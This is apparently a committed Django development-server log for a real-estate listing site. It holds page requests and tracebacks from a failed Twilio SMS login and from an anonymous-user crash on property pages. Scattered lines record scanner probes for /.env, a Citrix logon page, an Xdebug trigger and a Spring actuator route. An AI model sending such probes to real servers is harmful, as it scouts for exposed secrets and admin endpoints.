+[28/Nov/2023 20:47:49] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.03_PM_2.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:49] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.03_PM_1.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:50] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM_3.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:50] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.03_PM.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:50] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM_2.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:50] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM_1.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:50] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:50] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.01_PM_2.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:50] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.01_PM.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:50] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.01_PM_1.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:50] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.00_PM.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:53] "GET /request-contract/ HTTP/1.1" 200 7903
+[28/Nov/2023 20:47:53] "GET /static/css/pages/request_contract.css HTTP/1.1" 200 4480
+[28/Nov/2023 20:47:53] "GET /static/imgs/%D8%A7%D9%8A%D9%82%D9%88%D9%86%D8%A9%20%D8%B9%D9%82%D8%AF%20%D8%A7%D9%8A%D8%AC%D8%A7%D8%B1%20%D9%85%D9%88%D8%AD%D8%AF.png HTTP/1.1" 200 48220
+Not Found: /request-contract/assets/imgs/logo.jpeg
+[28/Nov/2023 20:47:54] "GET /request-contract/assets/imgs/logo.jpeg HTTP/1.1" 404 4184
+[28/Nov/2023 20:47:55] "GET /about/ HTTP/1.1" 200 6015
+[28/Nov/2023 20:47:55] "GET /static/css/pages/about.css HTTP/1.1" 200 1043
+Not Found: /about/assets/imgs/albdah-gallery-1.jpeg
+[28/Nov/2023 20:47:55] "GET /about/assets/imgs/albdah-gallery-1.jpeg HTTP/1.1" 404 4187
+Not Found: /about/assets/imgs/albdah-gallery-2.jpeg
+[28/Nov/2023 20:47:56] "GET /about/assets/imgs/albdah-gallery-2.jpeg HTTP/1.1" 404 4187
+Not Found: /about/assets/imgs/albdah-gallery-3.jpeg
+[28/Nov/2023 20:47:56] "GET /about/assets/imgs/albdah-gallery-3.jpeg HTTP/1.1" 404 4187
+Not Found: /about/assets/imgs/logo.jpeg
+[28/Nov/2023 20:47:56] "GET /about/assets/imgs/logo.jpeg HTTP/1.1" 404 4151
+[28/Nov/2023 20:47:56] "GET /accounts/profile/ HTTP/1.1" 200 10322
+[28/Nov/2023 20:48:00] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:48:02] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:48:06] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:48:06] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:48:09] "GET /accounts/profile/ HTTP/1.1" 200 10322
+[28/Nov/2023 20:48:09] "GET /favourites/ HTTP/1.1" 200 8113
+[28/Nov/2023 20:48:11] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:48:14] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:48:14] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:48:15] "GET /accounts/profile/ HTTP/1.1" 200 10322
+[28/Nov/2023 20:48:16] "GET /favourites/ HTTP/1.1" 200 5546
+[28/Nov/2023 20:48:17] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:48:18] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 21:03:06] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 21:05:35] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 21:05:35] "GET /static/css/normalize.css HTTP/1.1" 200 6138
+[28/Nov/2023 21:05:35] "GET /static/css/pages/main.css HTTP/1.1" 200 9243
+[28/Nov/2023 21:05:35] "GET /static/js/pages/app.js HTTP/1.1" 200 199
+[28/Nov/2023 21:05:35] "GET /static/js/pages/index.js HTTP/1.1" 200 591
+[28/Nov/2023 21:05:36] "GET /static/imgs/logo.jpeg HTTP/1.1" 200 32248
+[28/Nov/2023 21:05:36] "GET /static/imgs/logoText-e961f794.png HTTP/1.1" 200 5115
+[28/Nov/2023 21:05:36] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.04_PM.jpeg HTTP/1.1" 200 838594
+[28/Nov/2023 21:05:36] "GET /static/imgs/logo-transparent.png HTTP/1.1" 200 1465
+[28/Nov/2023 21:06:16] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 21:06:25] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 21:07:38] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 21:07:38] "GET /static/js/pages/index.js HTTP/1.1" 304 0
+Not Found: /logon/LogonPoint/index.html
+[28/Nov/2023 21:17:45] "GET /logon/LogonPoint/index.html HTTP/1.1" 404 4152
+Not Found: /logon/LogonPoint/custom.html
+[28/Nov/2023 21:17:46] "GET /logon/LogonPoint/custom.html HTTP/1.1" 404 4155
+[28/Nov/2023 21:28:03] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 21:29:27] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 13994
+[28/Nov/2023 21:31:59] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 21:33:15] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 21:33:16] "GET /static/css/pages/main.css HTTP/1.1" 304 0
+[28/Nov/2023 21:33:16] "GET /static/js/pages/index.js HTTP/1.1" 304 0
+[28/Nov/2023 21:33:17] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 21:33:19] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 21:34:09] "GET /maps/search HTTP/1.1" 200 14763
+[28/Nov/2023 21:34:14] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 21:34:15] "GET /property/add-property/ HTTP/1.1" 200 12178
+[28/Nov/2023 21:34:15] "GET /static/js/property/add-property-interface.js HTTP/1.1" 200 1233
+[28/Nov/2023 21:34:16] "GET /static/css/property/add-property-interface.css HTTP/1.1" 304 0
+[28/Nov/2023 21:34:20] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 21:34:38] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 21:34:38] "GET /static/css/property/property-details.css HTTP/1.1" 304 0
+[28/Nov/2023 21:34:46] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 21:35:14] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 21:35:15] "GET /static/css/normalize.css HTTP/1.1" 200 6138
+[28/Nov/2023 21:35:16] "GET /static/imgs/logo-transparent.png HTTP/1.1" 304 0
+[28/Nov/2023 21:35:16] "GET /static/css/pages/main.css HTTP/1.1" 200 9243
+[28/Nov/2023 21:35:16] "GET /static/js/pages/app.js HTTP/1.1" 200 199
+[28/Nov/2023 21:35:16] "GET /static/js/pages/index.js HTTP/1.1" 200 591
+[28/Nov/2023 21:35:16] "GET /static/imgs/logoText-e961f794.png HTTP/1.1" 200 5115
+[28/Nov/2023 21:35:16] "GET /static/imgs/logo.jpeg HTTP/1.1" 200 32248
+[28/Nov/2023 21:35:16] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.04_PM.jpeg HTTP/1.1" 200 838594
+Not Found: /assets/imgs/logo.jpeg
+[28/Nov/2023 21:35:16] "GET /assets/imgs/logo.jpeg HTTP/1.1" 404 4133
+[28/Nov/2023 21:35:30] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 21:35:34] "GET /property/add-property/ HTTP/1.1" 302 0
+[28/Nov/2023 21:35:34] "GET /auth/?next=/property/add-property/ HTTP/1.1" 200 8277
+[28/Nov/2023 21:35:34] "GET /static/css/users/authenticate.css HTTP/1.1" 200 1296
+Not Found: /auth/assets/imgs/logo.jpeg
+[28/Nov/2023 21:35:35] "GET /auth/assets/imgs/logo.jpeg HTTP/1.1" 404 4148
+Internal Server Error: /auth/sendotp
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/accounts/views.py", line 101, in send_otp
+    send_sms(otp.otp, otp.phone_number)
+  File "/albdah-rebuild/albdah-rebuild/accounts/utils.py", line 19, in send_sms
+    .create(
+     ^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/twilio/rest/api/v2010/account/message/__init__.py", line 560, in create
+    payload = self._version.create(
+              ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/twilio/base/version.py", line 465, in create
+    return self._parse_create(method, uri, response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/twilio/base/version.py", line 436, in _parse_create
+    raise self.exception(method, uri, response, "Unable to create record")
+twilio.base.exceptions.TwilioRestException: HTTP 401 error: Unable to create record: Authenticate
+[28/Nov/2023 21:35:45] "POST /auth/sendotp HTTP/1.1" 500 84818
+Not Found: /favicon.ico
+[28/Nov/2023 21:35:46] "GET /favicon.ico HTTP/1.1" 404 4103
+[28/Nov/2023 21:36:14] "POST /login/ HTTP/1.1" 200 8435
+Not Found: /login/assets/imgs/logo.jpeg
+[28/Nov/2023 21:36:15] "GET /login/assets/imgs/logo.jpeg HTTP/1.1" 404 4151
+[28/Nov/2023 21:36:18] "POST /login/ HTTP/1.1" 200 8435
+[28/Nov/2023 21:36:29] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 21:36:37] "GET /about/ HTTP/1.1" 200 5999
+Not Found: /about/assets/imgs/albdah-gallery-1.jpeg
+[28/Nov/2023 21:36:37] "GET /static/css/pages/about.css HTTP/1.1" 200 1043
+[28/Nov/2023 21:36:37] "GET /about/assets/imgs/albdah-gallery-1.jpeg HTTP/1.1" 404 4187
+Not Found: /about/assets/imgs/albdah-gallery-3.jpeg
+Not Found: /about/assets/imgs/albdah-gallery-2.jpeg
+[28/Nov/2023 21:36:37] "GET /about/assets/imgs/albdah-gallery-2.jpeg HTTP/1.1" 404 4187
+[28/Nov/2023 21:36:37] "GET /about/assets/imgs/albdah-gallery-3.jpeg HTTP/1.1" 404 4187
+Not Found: /about/assets/imgs/logo.jpeg
+[28/Nov/2023 21:36:38] "GET /about/assets/imgs/logo.jpeg HTTP/1.1" 404 4151
+[28/Nov/2023 21:36:47] "GET /about/ HTTP/1.1" 200 5999
+Not Found: /about/assets/imgs/albdah-gallery-1.jpeg
+Not Found: /about/assets/imgs/albdah-gallery-2.jpeg
+[28/Nov/2023 21:36:47] "GET /about/assets/imgs/albdah-gallery-1.jpeg HTTP/1.1" 404 4187
+[28/Nov/2023 21:36:47] "GET /about/assets/imgs/albdah-gallery-2.jpeg HTTP/1.1" 404 4187
+Not Found: /about/assets/imgs/albdah-gallery-3.jpeg
+[28/Nov/2023 21:36:48] "GET /about/assets/imgs/albdah-gallery-3.jpeg HTTP/1.1" 404 4187
+[28/Nov/2023 21:36:54] "GET /request-contract/ HTTP/1.1" 200 7887
+[28/Nov/2023 21:36:54] "GET /static/css/pages/request_contract.css HTTP/1.1" 200 4480
+[28/Nov/2023 21:36:55] "GET /static/imgs/%D8%A7%D9%8A%D9%82%D9%88%D9%86%D8%A9%20%D8%B9%D9%82%D8%AF%20%D8%A7%D9%8A%D8%AC%D8%A7%D8%B1%20%D9%85%D9%88%D8%AD%D8%AF.png HTTP/1.1" 200 48220
+Not Found: /request-contract/assets/imgs/logo.jpeg
+[28/Nov/2023 21:36:55] "GET /request-contract/assets/imgs/logo.jpeg HTTP/1.1" 404 4184
+[28/Nov/2023 21:37:25] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 21:37:31] "GET /property/add-property/ HTTP/1.1" 302 0
+[28/Nov/2023 21:37:31] "GET /auth/?next=/property/add-property/ HTTP/1.1" 200 8277
+[28/Nov/2023 21:37:32] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 21:37:44] "GET /property/add-property/ HTTP/1.1" 302 0
+[28/Nov/2023 21:37:44] "GET /auth/?next=/property/add-property/ HTTP/1.1" 200 8277
+[28/Nov/2023 21:37:47] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 21:38:17] "GET /admin HTTP/1.1" 301 0
+[28/Nov/2023 21:38:18] "GET /admin/ HTTP/1.1" 302 0
+[28/Nov/2023 21:38:18] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 4418
+[28/Nov/2023 21:38:18] "GET /static/admin/css/base.css HTTP/1.1" 200 21207
+[28/Nov/2023 21:38:18] "GET /static/admin/css/login.css HTTP/1.1" 200 958
+[28/Nov/2023 21:38:18] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3063
+[28/Nov/2023 21:38:18] "GET /static/admin/css/dark_mode.css HTTP/1.1" 200 2929
+[28/Nov/2023 21:38:18] "GET /static/override.css HTTP/1.1" 200 156
+[28/Nov/2023 21:38:18] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2694
+[28/Nov/2023 21:38:18] "GET /static/admin/css/rtl.css HTTP/1.1" 200 4788
+[28/Nov/2023 21:38:19] "GET /static/admin/js/theme.js HTTP/1.1" 200 1943
+[28/Nov/2023 21:38:19] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18533
+[28/Nov/2023 21:38:19] "GET /static/admin/css/responsive_rtl.css HTTP/1.1" 200 1785
+[28/Nov/2023 21:38:35] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[28/Nov/2023 21:38:35] "GET /admin/ HTTP/1.1" 200 12924
+[28/Nov/2023 21:38:36] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 441
+[28/Nov/2023 21:38:36] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[28/Nov/2023 21:38:36] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[28/Nov/2023 21:38:36] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[28/Nov/2023 21:38:40] "GET /admin/page/home/ HTTP/1.1" 200 10321
+[28/Nov/2023 21:38:40] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6566
+[28/Nov/2023 21:38:40] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 292458
+[28/Nov/2023 21:38:41] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:38:41] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7887
+[28/Nov/2023 21:38:41] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[28/Nov/2023 21:38:41] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[28/Nov/2023 21:38:41] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[28/Nov/2023 21:38:41] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 8943
+[28/Nov/2023 21:38:41] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[28/Nov/2023 21:38:41] "GET /static/admin/js/core.js HTTP/1.1" 200 5682
+[28/Nov/2023 21:38:41] "GET /static/admin/js/filters.js HTTP/1.1" 200 978
+[28/Nov/2023 21:38:42] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[28/Nov/2023 21:38:46] "GET /admin/ HTTP/1.1" 200 12924
+[28/Nov/2023 21:39:02] "GET /admin/accounts/favourite/ HTTP/1.1" 200 12024
+[28/Nov/2023 21:39:03] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:39:03] "GET /static/admin/img/search.svg HTTP/1.1" 304 0
+[28/Nov/2023 21:39:10] "GET /admin/ HTTP/1.1" 200 12924
+[28/Nov/2023 21:39:13] "GET /admin/codes/code/ HTTP/1.1" 200 12323
+[28/Nov/2023 21:39:13] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:39:16] "GET /admin/codes/code/2/change/ HTTP/1.1" 200 13127
+[28/Nov/2023 21:39:16] "GET /static/admin/css/forms.css HTTP/1.1" 200 9047
+[28/Nov/2023 21:39:16] "GET /static/admin/css/widgets.css HTTP/1.1" 200 11900
+[28/Nov/2023 21:39:17] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 586
+[28/Nov/2023 21:39:17] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[28/Nov/2023 21:39:17] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:39:17] "GET /static/admin/img/icon-viewlink.svg HTTP/1.1" 200 581
+[28/Nov/2023 21:39:23] "GET /admin/codes/code/ HTTP/1.1" 200 12323
+[28/Nov/2023 21:39:23] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:39:25] "GET /admin/codes/code/3/change/ HTTP/1.1" 200 13127
+[28/Nov/2023 21:39:25] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:39:29] "GET /admin/codes/code/ HTTP/1.1" 200 12323
+[28/Nov/2023 21:39:29] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:39:34] "GET /admin/ HTTP/1.1" 200 12924
+[28/Nov/2023 21:39:39] "GET /admin/codes/otp/ HTTP/1.1" 200 19204
+[28/Nov/2023 21:39:39] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:39:41] "GET /admin/codes/otp/28/change/ HTTP/1.1" 200 11996
+[28/Nov/2023 21:39:41] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:39:46] "GET /admin/codes/otp/ HTTP/1.1" 200 19204
+[28/Nov/2023 21:39:46] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:39:49] "GET /admin/codes/otp/5/change/ HTTP/1.1" 200 11994
+[28/Nov/2023 21:39:49] "GET /admin/codes/otp/5/change/ HTTP/1.1" 200 11994
+[28/Nov/2023 21:39:50] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:39:53] "GET /admin/codes/otp/ HTTP/1.1" 200 19204
+[28/Nov/2023 21:39:53] "GET /admin/ HTTP/1.1" 200 12924
+[28/Nov/2023 21:39:57] "GET /admin/property/report/ HTTP/1.1" 200 11968
+[28/Nov/2023 21:39:57] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:40:00] "GET /admin/property/report/1/change/ HTTP/1.1" 200 13333
+[28/Nov/2023 21:40:00] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:40:13] "GET /admin/property/property/2/change/?_to_field=id HTTP/1.1" 200 46392
+[28/Nov/2023 21:40:13] "GET /static/markdownx/js/markdownx.js HTTP/1.1" 200 32685
+[28/Nov/2023 21:40:13] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 21:40:13] "POST /markdownx/markdownify/ HTTP/1.1" 200 311
+Not Found: /APTw
+[28/Nov/2023 21:50:13] "GET /APTw HTTP/1.1" 404 4083
+Not Found: /tSAU
+[28/Nov/2023 21:50:13] "GET /tSAU HTTP/1.1" 404 4083
+Not Found: /1mZd
+[28/Nov/2023 21:50:13] "GET /1mZd HTTP/1.1" 404 4083
+Not Found: /CeFo
+[28/Nov/2023 21:50:14] "GET /CeFo HTTP/1.1" 404 4083
+[28/Nov/2023 22:11:53] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 22:22:19] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 22:22:24] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 22:22:39] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 22:22:45] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 22:22:52] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 22:23:03] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 22:23:04] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 22:23:05] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 22:27:35] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 22:45:32] "GET / HTTP/1.1" 200 13994
+Not Found: /actuator/gateway/routes
+[28/Nov/2023 22:55:52] "GET /actuator/gateway/routes HTTP/1.1" 404 4144
+[28/Nov/2023 23:13:39] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 23:27:37] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 23:29:57] "GET / HTTP/1.1" 200 13994
+Not Found: /.env
+[28/Nov/2023 23:37:00] "GET /.env HTTP/1.1" 404 4083
+Not Found: /robots.txt
+[28/Nov/2023 23:39:51] "GET /robots.txt HTTP/1.1" 404 4096
+Not Found: /sitemap.xml
+[28/Nov/2023 23:39:51] "GET /sitemap.xml HTTP/1.1" 404 4099
+[28/Nov/2023 23:39:51] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 23:39:51] "GET /property/add-property/ HTTP/1.1" 302 0
+[28/Nov/2023 23:39:51] "GET /request-contract/ HTTP/1.1" 200 7887
+[28/Nov/2023 23:39:51] "GET /about/ HTTP/1.1" 200 5999
+[28/Nov/2023 23:39:52] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 23:39:52] "GET /maps/search HTTP/1.1" 200 14747
+Internal Server Error: /property/69AqZ/details/
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py", line 2053, in get_prep_value
+    return int(value)
+           ^^^^^^^^^^
+TypeError: int() argument must be a string, a bytes-like object or a real number, not 'SimpleLazyObject'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/property/views.py", line 23, in property_details
+    ad = Favourite.objects.get(user=request.user, property=property)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 623, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+                                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1436, in filter
+    return self._filter_or_exclude(False, args, kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1454, in _filter_or_exclude
+    clone._filter_or_exclude_inplace(negate, args, kwargs)
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1461, in _filter_or_exclude_inplace
+    self._query.add_q(Q(*args, **kwargs))
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1545, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1576, in _add_q
+    child_clause, needed_inner = self.build_filter(
+                                 ^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1491, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1318, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+             ^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/lookups.py", line 27, in __init__
+    self.rhs = self.get_prep_lookup()
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/related_lookups.py", line 166, in get_prep_lookup
+    self.rhs = target_field.get_prep_value(self.rhs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py", line 2055, in get_prep_value
+    raise e.__class__(
+TypeError: Field 'id' expected a number but got <SimpleLazyObject: <django.contrib.auth.models.AnonymousUser object at 0x7fab24782b10>>.
+[28/Nov/2023 23:39:52] "GET /property/69AqZ/details/ HTTP/1.1" 500 127143
+[28/Nov/2023 23:39:52] "GET /static/css/maps/style.css HTTP/1.1" 200 2701
+[28/Nov/2023 23:39:52] "GET /static/css/normalize.css HTTP/1.1" 200 6138
+Not Found: /maps/house
+[28/Nov/2023 23:39:52] "GET /auth/?next=/property/add-property/ HTTP/1.1" 200 8277
+[28/Nov/2023 23:39:52] "GET /static/js/maps/app.js HTTP/1.1" 200 3386
+[28/Nov/2023 23:39:52] "GET /maps/house HTTP/1.1" 404 4173
+[28/Nov/2023 23:39:52] "GET /static/js/pages/index.js HTTP/1.1" 200 591
+[28/Nov/2023 23:39:52] "GET /static/js/pages/app.js HTTP/1.1" 200 199
+[28/Nov/2023 23:39:52] "GET /static/css/pages/main.css HTTP/1.1" 200 9243
+[28/Nov/2023 23:39:52] "GET /auth/?next=/property/add-property/ HTTP/1.1" 200 8277
+[28/Nov/2023 23:39:53] "GET /static/css/pages/about.css HTTP/1.1" 200 1043
+[28/Nov/2023 23:39:53] "GET /static/css/pages/request_contract.css HTTP/1.1" 200 4480
+[28/Nov/2023 23:39:53] "GET /static/css/users/authenticate.css HTTP/1.1" 200 1296
+Not Found: /necolas/normalize.css
+[28/Nov/2023 23:39:53] "GET /necolas/normalize.css HTTP/1.1" 404 4129
+Internal Server Error: /property/69AqZ/details/
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py", line 2053, in get_prep_value
+    return int(value)
+           ^^^^^^^^^^
+TypeError: int() argument must be a string, a bytes-like object or a real number, not 'SimpleLazyObject'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/property/views.py", line 23, in property_details
+    ad = Favourite.objects.get(user=request.user, property=property)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 623, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+                                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1436, in filter
+    return self._filter_or_exclude(False, args, kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1454, in _filter_or_exclude
+    clone._filter_or_exclude_inplace(negate, args, kwargs)
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1461, in _filter_or_exclude_inplace
+    self._query.add_q(Q(*args, **kwargs))
